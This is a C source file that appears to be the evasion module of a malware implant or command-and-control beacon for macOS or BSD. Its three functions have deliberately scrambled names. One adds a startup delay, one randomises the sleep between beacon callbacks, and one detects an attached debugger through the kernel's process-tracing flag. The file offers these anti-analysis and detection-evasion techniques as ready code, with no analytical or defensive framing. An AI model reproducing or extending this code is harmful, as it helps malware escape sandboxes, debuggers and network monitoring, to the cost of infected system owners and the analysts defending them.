#include "evasion.h"
#include "config.h"
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/sysctl.h>
void xkqprtmn(void) {
    sleep(STARTUP_SLEEP);
}
void bvzlwqrt(void) {
    srand((unsigned)time(NULL) ^ (unsigned)getpid());
    int interval = BEACON_MIN + rand() % (BEACON_MAX - BEACON_MIN + 1);
    sleep(interval);
}
int mxntpqvb(void) {
    struct kinfo_proc info = {0};
    size_t size = sizeof(info);
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
    sysctl(mib, 4, &info, &size, NULL, 0);
    return (info.kp_proc.p_flag & P_TRACED) != 0;
}
